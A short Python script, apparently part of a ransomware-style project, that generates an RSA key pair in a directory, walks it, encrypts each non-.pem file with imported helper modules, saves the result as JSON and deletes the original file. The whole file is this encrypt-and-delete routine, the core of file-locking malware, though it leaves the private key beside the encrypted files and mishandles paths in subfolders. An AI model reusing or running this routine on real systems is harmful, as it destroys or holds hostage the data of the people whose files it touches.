import os
import MyRSAEncrypt
import json
import GetRSAKeys

def Walk(dir):
    GetRSAKeys.getRSAKeys(dir + "/PublicKey.pem", dir + "/PrivateKey.pem")
    for dirName, subdirList, fileList in os.walk(dir):
        for i in fileList:
            if ".pem" not in i:
                (RSACipher, C, IV, tag, ext) = MyRSAEncrypt.MyRSAEncrypt(dir+"/"+i, dir+"/PublicKey.pem")
                with open(dir+"/"+i+".json", 'w') as jsonFile:
                    data = (str(RSACipher), str(C), str(IV), str(tag), str(ext))
                    json.dump(data, jsonFile)
                    os.remove(dir+"/"+i)